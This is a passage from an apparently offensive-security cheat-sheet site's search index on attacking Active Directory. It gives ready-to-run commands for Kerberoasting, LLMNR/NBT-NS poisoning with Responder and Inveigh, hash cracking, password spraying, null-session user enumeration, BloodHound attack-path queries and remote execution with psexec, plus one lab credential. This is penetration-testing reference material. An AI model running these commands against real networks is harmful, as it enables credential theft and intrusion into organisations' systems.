<p>Perform Kerberoasting with alternate credentials: <pre><code>.\\Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\\USER /credpassword:PASSWORD\n</code></pre></p> </li> <li> <p>Perform Kerberoasting with an existing TGT: <pre><code>.\\Rubeus.exe kerberoast /ticket:BASE64 | /ticket:FILE.KIRBI\n</code></pre></p> </li> <li> <p>Perform OPSEC-safe Kerberoasting: <pre><code>.\\Rubeus.exe kerberoast /rc4opsec\n</code></pre></p> </li> <li> <p>Request tickets for accounts with an admin count of 1: <pre><code>.\\Rubeus.exe kerberoast /ldapfilter:'admincount=1'\n</code></pre></p> </li> <li> <p>Perform Kerberoasting with a delay and jitter: <pre><code>.\\Rubeus.exe kerberoast /delay:5000 /jitter:30\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/readme/","title":"README","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/readme/#introduction","title":"Introduction","text":"<p>Kerberos is a network authentication protocol that uses secret-key cryptography to provide secure authentication for client/server applications. It employs a trusted third party, the Key Distribution Center (KDC), to issue tickets that validate user identities, protecting against eavesdropping and replay attacks. Kerberos is commonly integrated into secure operating environments, such as Microsoft Windows, to safeguard user data and services.  </p>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/readme/#key-components","title":"Key Components","text":"Component Description KDC (Key Distribution Center) Central authority for issuing session keys and tickets. TGT (Ticket Granting Ticket) Issued by the KDC to request service tickets from the TGS. TGS (Ticket Granting Service) A KDC component that issues service tickets for accessing services. Service Ticket Grants user access to network services."},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Kerberoasting/readme/#common-kerberos-commands","title":"Common Kerberos Commands","text":"<p>Key commands for managing Kerberos tickets.  </p> Command Description <code>kinit [username]</code> Obtain a Ticket-Granting Ticket (TGT) for the user and save it in the cache. <code>klist</code> Display all cached Kerberos tickets. <code>ktutil</code> Manage Kerberos keytab files. <code>kdestroy</code> Remove all cached Kerberos tickets for the user."},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/From-Linux/","title":"From Linux","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/From-Linux/#step-1-starting-responder","title":"Step 1. Starting Responder","text":"<p>To begin, ensure that Responder is installed on your system. If it\u2019s not already installed, follow these steps:  </p> <ol> <li> <p>Update the package list: <pre><code>sudo apt update\n</code></pre></p> </li> <li> <p>Install Responder: <pre><code>sudo apt install responder\n</code></pre></p> </li> <li> <p>Run Responder with default settings, Replace <code>ens224</code> with the name of your network interface: <pre><code>sudo responder -I ens224\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/From-Linux/#step-2-responder-operational-overview","title":"Step 2. Responder Operational Overview","text":"<p>Responder actively listens for LLMNR, NBT-NS, and MDNS requests on the network and responds to them. When it captures a hash, it saves it in the <code>/usr/share/responder/logs</code> directory. You can monitor activity either directly in the terminal or by reviewing the log files.  </p> <ul> <li>Terminal Output: Responder displays captured hashes and relevant information in real time.  </li> <li>Log Files: Captured hashes are stored in <code>/usr/share/responder/logs</code>.  </li> <li>Captured Data: Typically, Responder captures NTLMv2 hashes, logging them with real-time updates.  </li> </ul>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/From-Linux/#step-3-cracking-ntlmv2-hashes","title":"Step 3. Cracking NTLMv2 Hashes","text":"<p>Once you have captured hashes, you can crack them using Hashcat or John the Ripper. The examples below use the <code>rockyou.txt</code> wordlist.  </p> <ol> <li> <p>Crack NTLMv2 hashes with Hashcat: <pre><code>hashcat -m 5600 captured_ntlmv2 /usr/share/wordlists/rockyou.txt\n</code></pre></p> </li> <li> <p>Crack NTLMv2 hashes with John the Ripper: <pre><code>john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt captured_ntlmv2.txt\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/From-Windows/","title":"From Windows","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/From-Windows/#running-inveigh-in-powershell","title":"Running Inveigh in PowerShell","text":"<ol> <li> <p>Load the Inveigh module into PowerShell: <pre><code>Import-Module .\\Inveigh.ps1\n</code></pre></p> </li> <li> <p>Check available parameters for the <code>Invoke-Inveigh</code> cmdlet: <pre><code>(Get-Command Invoke-Inveigh).Parameters\n</code></pre></p> </li> <li> <p>Run Inveigh to start spoofing LLMNR and NBNS requests, with console and file output enabled: <pre><code>Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/From-Windows/#using-inveighzero-c-version","title":"Using InveighZero (C# Version)","text":"<ol> <li> <p>Run the C# version of Inveigh: <pre><code>.\\Inveigh.exe\n</code></pre></p> </li> <li> <p>Enter the interactive console: Press <code>ESC</code> to switch to interactive mode.  </p> </li> <li> <p>Use the following commands within the console for specific information:  </p> </li> <li> <p>Get one captured NTLMv2 hash per user: <pre><code>GET NTLMV2UNIQUE\n</code></pre></p> </li> <li> <p>Get usernames and source IPs/hostnames: <pre><code>GET NTLMV2USERNAMES\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/From-Windows/#step-by-step-attack-execution","title":"Step-by-Step Attack Execution","text":"<ol> <li> <p>Start Inveigh with default settings: <pre><code>Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y\n</code></pre></p> </li> <li> <p>Use the console commands to view captured hashes and usernames.  </p> </li> <li> <p>Captured hashes are saved in the specified output directory. By default, they are stored in: <pre><code>C:\\Tools\n</code></pre></p> </li> <li> <p>Prepare hashes for cracking. Ensure they are in a format compatible with Hashcat.  </p> </li> <li> <p>Crack the hashes with Hashcat: <pre><code>hashcat -m 5600 hash_file.txt /usr/share/wordlists/rockyou.txt\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/readme/","title":"Readme","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/readme/#introduction","title":"Introduction","text":"<p>Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are fallback name resolution protocols used in Windows environments. They are designed to help machines on the same local network resolve hostnames when DNS resolution fails. However, these protocols are inherently vulnerable to poisoning attacks, which can be exploited by an attacker to intercept traffic and capture credentials.  </p>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/readme/#llmnr-link-local-multicast-name-resolution","title":"LLMNR (Link-Local Multicast Name Resolution)","text":"Aspect Details Protocol Based on DNS Port 5355 (UDP) Purpose Resolves hostnames to IP addresses within the same local network segment"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/readme/#nbt-ns-netbios-name-service","title":"NBT-NS (NetBIOS Name Service)","text":"Aspect Details Protocol Part of the NetBIOS over TCP/IP suite Port 137 (UDP) Purpose Resolves NetBIOS names to IP addresses within the same local network segment"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/readme/#how-it-works","title":"How It Works","text":"<p>When a machine cannot resolve a hostname via DNS, it falls back to LLMNR and NBT-NS to ask other machines on the local network for the address. This behavior can be exploited by an attacker using tools like Responder to spoof responses and capture sensitive information such as NetNTLM hashes.  </p>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/NBT-NS-Poisoning/readme/#example-attack-flow","title":"Example Attack Flow","text":"<ol> <li>Hostname Query: A host attempts to connect to <code>\\\\fileserver.example.local</code> but mistypes it as <code>\\\\filesrver.example.local</code>.  </li> <li>DNS failure: The DNS server responds that the hostname is unknown.  </li> <li>Broadcast Request: The host broadcasts a request on the local network for <code>\\\\filesrver.example.local</code>.  </li> <li>Attacker Response: An attacker running Responder replies, pretending to be <code>\\\\filesrver.example.local</code>.  </li> <li>Credential Capture: The host sends an authentication request to the attacker, including a username and NTLMv2 password hash.  </li> <li>Exploitation: The attacker captures the hash and can attempt to crack it offline or use it in further attacks such as SMB relay.  </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Password-Spraying/From-Linux/","title":"From Linux","text":"<ol> <li> <p>Using Rpcclient for Password Spraying     <pre><code>for u in $(cat valid_users.txt); do \n    rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; \ndone\n</code></pre></p> </li> <li> <p>Using Kerbrute for Password Spraying      <code>kerbrute passwordspray -d example.local --dc [IP_ADDRESS] valid_users.txt [PASSWORD]</code></p> </li> <li> <p>Using CrackMapExec for Password Spraying     <code>sudo crackmapexec smb [IP_ADDRESS] -u valid_users.txt -p [PASSWORD] | grep +</code></p> </li> <li> <p>Validating Credentials with CrackMapExec     <code>sudo crackmapexec smb [IP_ADDRESS] -u [USERNAME] -p [PASSWORD]</code></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Password-Spraying/From-Windows/","title":"From Windows","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Password-Spraying/From-Windows/#using-domainpasswordsprayps1","title":"Using DomainPasswordSpray.ps1","text":"<ol> <li> <p>Import the DomainPasswordSpray module: <pre><code>Import-Module .\\DomainPasswordSpray.ps1\n</code></pre></p> </li> <li> <p>Run <code>Invoke-DomainPasswordSpray</code> with the desired password and output file parameters: <pre><code>Invoke-DomainPasswordSpray -Password [PASSWORD] -OutFile spray_success -ErrorAction SilentlyContinue\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Password-Spraying/From-Windows/#using-kerbrute-for-password-spraying","title":"Using Kerbrute for Password Spraying","text":"<ol> <li>Execute the password spray attack: <pre><code>kerbrute passwordspray -d example.local --dc [IP_ADDRESS] valid_users.txt [PASSWORD]\n</code></pre></li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Password-Spraying/From-Windows/#using-runascsexe","title":"Using RunasCs.exe","text":"<ol> <li> <p>Validate credentials locally without requiring SMB, LDAP, WinRM, Kerberos, or other authenticated services: <pre><code>.\\RunasCs.exe Administrator notthepassword \"cmd /c whoami\"\n</code></pre></p> </li> <li> <p>Use the <code>spray-passwords.ps1</code> script: Spray-Passwords.ps1 </p> </li> </ol> <p>Example usage to test passwords against all users in AD, including admins:  </p> <pre><code>.\\spray-passwords.ps1 -Admin -Pass IamUser01\n.\\spray-passwords.ps1 -Admin -Pass IamUser02\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Password-Spraying/readme/","title":"Readme","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Attack-Vectors/Password-Spraying/readme/#creating-a-wordlist","title":"Creating a Wordlist","text":"<p>Before performing a password spraying attack, ensure you have a valid wordlist of usernames. This can be created using various methods such as user enumeration tools or by collecting data from previous engagements.</p>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/ACL-Enumeration/","title":"ACL Enumeration","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/ACL-Enumeration/#introduction","title":"Introduction","text":"<p>ACL (Access Control List) enumeration is a critical step in understanding permissions and potential attack paths within an Active Directory (AD) environment. This cheat sheet covers the use of PowerView for manual enumeration and BloodHound for graphical representation and attack path discovery.</p>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/ACL-Enumeration/#step-1-convert-usernames-to-sids-and-retrieve-acls","title":"Step 1: Convert Usernames to SIDs and Retrieve ACLs","text":"<ol> <li> <p>Import the PowerView module <pre><code>Import-Module .\\PowerView.ps1\n</code></pre></p> </li> <li> <p>Convert a username to a SID <pre><code>$userSID = Convert-UserToSID -Username mthompson\n</code></pre></p> </li> <li> <p>Get domain object ACLs for that SID <pre><code>Get-DomainObjectACL -Identity * | Where-Object {$_.SecurityIdentifier -eq $userSID}\n</code></pre></p> </li> <li> <p>Resolve GUID values into human-readable format <pre><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/ACL-Enumeration/#step-2-work-with-specific-guids","title":"Step 2: Work with Specific GUIDs","text":"<ol> <li> <p>Set a GUID <pre><code>$guid = \"3e0abfd0-1261-11d0-a060-00aa006c33ed\"\n</code></pre></p> </li> <li> <p>Find its mapping in AD <pre><code>Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select-Object Name,DisplayName,DistinguishedName,rightsGuid | Where-Object {$_.rightsGuid -eq $guid} | Format-List\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/ACL-Enumeration/#step-3-repeat-for-additional-users-and-groups","title":"Step 3: Repeat for Additional Users and Groups","text":"<ol> <li> <p>Convert another username to SID <pre><code>$sid2 = Convert-NameToSid -Username nwalker\n</code></pre></p> </li> <li> <p>Enumerate rights for that SID <pre><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $sid2} -Verbose\n</code></pre></p> </li> <li> <p>Check group nesting <pre><code>Get-DomainGroup -Identity \"Finance Team\" | Select-Object memberof\n</code></pre></p> </li> <li> <p>Convert a group name to SID <pre><code>$securityGroupSID = Convert-NameToSid -Username \"Security Operations\"\n</code></pre></p> </li> <li> <p>Enumerate rights for that group SID <pre><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $securityGroupSID} -Verbose\n</code></pre></p> </li> <li> <p>Convert another username to SID <pre><code>$jdoeSID = Convert-NameToSid -Username jdoe\n</code></pre></p> </li> <li> <p>Enumerate rights for that SID <pre><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | Where-Object {$_.SecurityIdentifier -eq $jdoeSID} -Verbose\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Username-Enumeration/","title":"Username Enumeration","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Username-Enumeration/#generate-user-list","title":"Generate User List","text":"<ol> <li> <p>Use sites like hunter.io to discover employee email patterns.    For example, entering <code>apple.com</code> shows emails often follow <code>{f}{last}@apple.com</code>.    By scraping a list of Apple employees from LinkedIn, you can convert names into emails (e.g., Steve Jobs \u2192 s.jobs@apple.com).    Not all guesses will be correct, but many should be valid.  </p> </li> <li> <p>Use a Python script to generate potential usernames <pre><code>wget https://gist.githubusercontent.com/superkojiman/11076951/raw/74f3de7740acb197ecfa8340d07d3926a95e5d46/namemash.py\n</code></pre></p> </li> <li> <p>Verify usernames with Kerbrute <pre><code>kerbrute userenum --dc [IP-ADDRESS] -d hackfast.local username.lst\n</code></pre></p> </li> </ol> <p>Note: You can also use built-in wordlists, e.g.: <pre><code>/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt\n</code></pre></p>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Username-Enumeration/#smb-enumeration","title":"SMB Enumeration","text":"<ol> <li> <p>Enumerate with NetExec <pre><code>netexec smb [IP-ADDRESS] -u users.txt -p '[PASSWORD]' --continue-on-success\n</code></pre></p> </li> <li> <p>Enumerate with CrackMapExec <pre><code>crackmapexec smb [IP-ADDRESS] -u users.txt -p '[PASSWORD]' --continue-on-success\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Username-Enumeration/#winrm-enumeration","title":"WinRM Enumeration","text":"<ol> <li> <p>Enumerate with NetExec <pre><code>netexec winrm office.htb -u users.txt -p '[PASSWORD]' --continue-on-success\n</code></pre></p> </li> <li> <p>Enumerate with CrackMapExec <pre><code>crackmapexec winrm 10.10.10.184 -u users.txt -p '[PASSWORD]' --continue-on-success\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Username-Enumeration/#rpcclient-enumeration","title":"RPCClient Enumeration","text":"<ol> <li> <p>Start null session <pre><code>rpcclient -U \"\" -N [IP_ADDRESS]\n</code></pre></p> </li> <li> <p>List all users in the domain <pre><code>rpcclient -U \"\" -N [IP_ADDRESS] -c \"enumdomusers\" &gt; output.txt\n</code></pre></p> </li> <li> <p>Extract usernames from output <pre><code>cat output.txt | awk -F\\[ '{print $2}' | awk -F\\] '{print $1}' &gt; users.lst\n</code></pre></p> </li> <li> <p>Brute-force user RIDs <pre><code>for i in $(seq 500 1100); do rpcclient -N -U \"\" [IP_ADDRESS] -c \"queryuser 0x$(printf '%x\\n' $i)\" | grep \"User Name|user_rid|group_rid\" &amp;&amp; echo \"\"; done\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/readme/","title":"Readme","text":"<ol> <li> <p>SMB (Server Message Block)</p> <ul> <li> Look for any open shares.</li> <li> Try to log in with the guest user.</li> <li> Enumerate shared folders and their permissions.</li> <li> Search for sensitive files within shares (e.g., configuration files, scripts, documents).</li> </ul> </li> <li> <p>LDAP (Lightweight Directory Access Protocol)</p> <ul> <li> Check for accessible information without credentials.</li> <li> Enumerate users, groups, and organizational units.</li> <li> Retrieve detailed information about user accounts (e.g., attributes, password last set, account status).</li> <li> Search for service principal names (SPNs).</li> </ul> </li> <li> <p>Kerberos</p> <ul> <li> Brute force usernames.</li> <li> Check for AS-REP roastable accounts.</li> <li> Retrieve Kerberos tickets (TGT/TGS) and analyze them.</li> <li> Check for accounts with unconstrained delegation.</li> <li> Enumerate accounts with constrained delegation.</li> <li> Extract and analyze service principal names (SPNs).</li> </ul> </li> <li> <p>DNS (Domain Name System)</p> <ul> <li> Attempt zone transfer.</li> <li> Brute force subdomains.</li> <li> Enumerate DNS records to identify hosts and services.</li> <li> Investigate reverse lookup zones for additional information.</li> </ul> </li> <li> <p>RPC (Remote Procedure Call)</p> <ul> <li> Investigate anonymous access possibility.</li> <li> Enumerate users and groups via RPC.</li> <li> Query domain controllers for detailed information.</li> <li> Check for accessible services and endpoints.</li> </ul> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Credentialed-Enumeration/From-Linux/","title":"From Linux","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Credentialed-Enumeration/From-Linux/#using-crackmapexec-cme","title":"Using CrackMapExec (CME)","text":"<ol> <li> <p>Enumerate domain users: <pre><code>sudo crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p [PASSWORD] --users\n</code></pre></p> </li> <li> <p>Enumerate domain groups: <pre><code>sudo crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p [PASSWORD] --groups\n</code></pre></p> </li> <li> <p>Enumerate logged-on users: <pre><code>sudo crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p [PASSWORD] --loggedon-users\n</code></pre></p> </li> <li> <p>Enumerate shares: <pre><code>sudo crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p [PASSWORD] --shares\n</code></pre></p> </li> <li> <p>Enumerate shares recursively (Spider): <pre><code>sudo crackmapexec smb [IP-ADDRESS] -u [USERNAME] -p [PASSWORD] -M spider_plus --share\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Credentialed-Enumeration/From-Linux/#using-smbmap","title":"Using SMBMap","text":"<ol> <li> <p>Check access: <pre><code>smbmap -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -H [IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Recursively list all directories: <pre><code>smbmap -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -H [IP-ADDRESS] -R 'Department Shares' --dir-only\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Credentialed-Enumeration/From-Linux/#using-windapsearch","title":"Using Windapsearch","text":"<ol> <li> <p>Enumerate Domain Admins: <pre><code>python3 windapsearch.py --dc-ip [IP_ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] --da\n</code></pre></p> </li> <li> <p>Enumerate privileged users: <pre><code>python3 windapsearch.py --dc-ip [IP_ADDRESS] -u [USERNAME]@[DOMAIN] -p [PASSWORD] -PU\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Credentialed-Enumeration/From-Linux/#using-bloodhound","title":"Using BloodHound","text":"<ol> <li> <p>Execute BloodHound.py: <pre><code>sudo bloodhound-python -u '[USERNAME]' -p '[PASSWORD]' -ns [IP-ADDRESS] -d [DOMAIN] -c all\n</code></pre></p> </li> <li> <p>Start Neo4j service: <pre><code>sudo neo4j start\n</code></pre></p> </li> <li> <p>Start BloodHound GUI: <pre><code>bloodhound\n</code></pre></p> </li> </ol> <p>Example: <pre><code>/opt/Windows/BloodHound_Python/bloodhound.py -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.219.122\n</code></pre></p> <ul> <li> <p>Extract all user emails from a BloodHound user JSON file: <pre><code>cat 202020020_user.json | jq '.data[].Properties.name' | cut -d '\"' -f 2 &gt; useremail.txt\n</code></pre></p> </li> <li> <p>Extract usernames (without domain part) from emails: <pre><code>cat useremail.txt | cut -d '@' -f 1 &gt; users.list\n</code></pre></p> </li> </ul>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Credentialed-Enumeration/From-Linux/#using-impacket-psexec","title":"Using Impacket PsExec","text":"<ol> <li> <p>Remote command execution with PsExec: <pre><code>psexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]\n</code></pre></p> </li> <li> <p>Remote command execution with WMIExec: <pre><code>wmiexec.py [DOMAIN]/[USERNAME]:[PASSWORD]@[IP-ADDRESS]\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Credentialed-Enumeration/From-Windows/","title":"From Windows","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Credentialed-Enumeration/From-Windows/#active-directory-powershell-module","title":"Active Directory PowerShell Module","text":"<p>The Active Directory PowerShell module provides cmdlets for administering and querying an AD environment from the command line.  </p> <ol> <li> <p>Load the Active Directory module: <pre><code>Import-Module ActiveDirectory\n</code></pre></p> </li> <li> <p>Enumerate domain information: <pre><code>Get-ADDomain\n</code></pre></p> </li> <li> <p>Enumerate users with Service Principal Names (SPNs): <pre><code>Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n</code></pre></p> </li> <li> <p>Check for trust relationships: <pre><code>Get-ADTrust -Filter *\n</code></pre></p> </li> <li> <p>Enumerate groups: <pre><code>Get-ADGroup -Filter *\n</code></pre></p> </li> <li> <p>Get detailed group information: <pre><code>Get-ADGroup -Identity \"[GROUP]\"\n</code></pre></p> </li> <li> <p>Enumerate group members: <pre><code>Get-ADGroupMember -Identity \"[GROUP]\"\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Credentialed-Enumeration/From-Windows/#using-powerview","title":"Using PowerView","text":"<p>PowerView is a powerful PowerShell tool designed to enhance situational awareness in an AD environment.  </p> <ol> <li> <p>Get information about a specific domain user: <pre><code>Get-DomainUser -Identity \"[USERNAME]\"\n</code></pre></p> </li> <li> <p>Enumerate domain group members (recursive): <pre><code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse\n</code></pre></p> </li> <li> <p>Enumerate trust mappings: <pre><code>Get-DomainTrustMapping\n</code></pre></p> </li> <li> <p>Test administrative access to a computer: <pre><code>Test-AdminAccess -ComputerName \"[COMPUTERNAME]\"\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Credentialed-Enumeration/From-Windows/#using-sharpview","title":"Using SharpView","text":"<p>SharpView is the .NET implementation of PowerView, providing similar functionality for AD enumeration.  </p> <ol> <li> <p>Get information about a specific domain user: <pre><code>.\\SharpView.exe Get-DomainUser -Identity \"[USERNAME]\"\n</code></pre></p> </li> <li> <p>Enumerate all domain users: <pre><code>.\\SharpView.exe Get-DomainUser\n</code></pre></p> </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Credentialed-Enumeration/From-Windows/#using-snaffler","title":"Using Snaffler","text":"<p>Snaffler is a tool for locating sensitive data within an AD environment by enumerating network shares and directories.  </p> <ol> <li>Execute Snaffler: <pre><code>.\\Snaffler.exe -d \"domain\" -s -v data -o \"output.log\"\n</code></pre></li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Credentialed-Enumeration/From-Windows/#using-bloodhound","title":"Using BloodHound","text":"<p>BloodHound is a tool for analyzing AD trust relationships and identifying potential attack paths.  </p> <ol> <li> <p>Run SharpHound to collect data: <pre><code>.\\SharpHound.exe -c All --zipfilename \"output.zip\"\n</code></pre></p> </li> <li> <p>Ingest the data into BloodHound.  </p> </li> <li>Open the BloodHound GUI.  </li> <li>Click Upload Data.  </li> <li>Select the zip file generated by SharpHound.  </li> <li>Analyze the data using pre-built and custom queries.  </li> </ol>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/","title":"BloodHound Queries","text":""},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#list-all-owned-users","title":"List All Owned Users","text":"<pre><code>MATCH (m:User) WHERE m.owned=TRUE RETURN m\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#list-all-owned-computers","title":"List All Owned Computers","text":"<pre><code>MATCH (m:Computer) WHERE m.owned=TRUE RETURN m\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#list-all-owned-groups","title":"List All Owned Groups","text":"<pre><code>MATCH (m:Group) WHERE m.owned=TRUE RETURN m\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#list-all-high-value-targets","title":"List All High Value Targets","text":"<pre><code>MATCH (m) WHERE m.highvalue=TRUE RETURN m\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#list-the-groups-of-all-owned-users","title":"List the Groups of All Owned Users","text":"<pre><code>MATCH (m:User) WHERE m.owned=TRUE \nWITH m \nMATCH p=(m)-[:MemberOf*1..]-&gt;(n:Group) \nRETURN p\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-all-kerberoastable-users","title":"Find All Kerberoastable Users","text":"<pre><code>MATCH (n:User) WHERE n.hasspn=true RETURN n\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-users-with-spn-set-older-than-5-years","title":"Find Users with SPN Set Older Than 5 Years","text":"<pre><code>MATCH (u:User) \nWHERE u.hasspn=true \nAND u.pwdlastset &lt; (datetime().epochseconds - (5 * 365.25 * 86400)) \nAND NOT u.pwdlastset IN [-1.0, 0.0] \nRETURN u.name, u.pwdlastset \nORDER BY u.pwdlastset\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-kerberoastable-users-with-da-path","title":"Find Kerberoastable Users with DA Path","text":"<pre><code>MATCH (u:User {hasspn:true}) \nMATCH (g:Group) WHERE g.objectid ENDS WITH '-512' \nMATCH p = shortestPath((u)-[*1..]-&gt;(g)) \nRETURN p\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-machines-domain-users-can-rdp-into","title":"Find Machines Domain Users Can RDP Into","text":"<pre><code>MATCH p=(g:Group)-[:CanRDP]-&gt;(c:Computer) \nWHERE g.objectid ENDS WITH '-513' \nRETURN p\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-groups-that-can-reset-passwords","title":"Find Groups That Can Reset Passwords","text":"<pre><code>MATCH p=(m:Group)-[r:ForceChangePassword]-&gt;(n:User) RETURN p\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-groups-with-local-admin-rights","title":"Find Groups with Local Admin Rights","text":"<pre><code>MATCH p=(m:Group)-[r:AdminTo]-&gt;(n:Computer) RETURN p\n</code></pre>"},{"location":"Offensive-Security/Active-Directory/Initial-Scanning-%26-Enumeration/Tools/Linux/BloodHound-Queries/#find-all-active-domain-admin-sessions","title":"Find All Active Domain Admin Sessions","text":"<pre><code>MATCH (n:User)-[:MemberOf]-&gt;(g:Group) \nWHERE g.objectid ENDS WITH '-512' \nMATCH p = 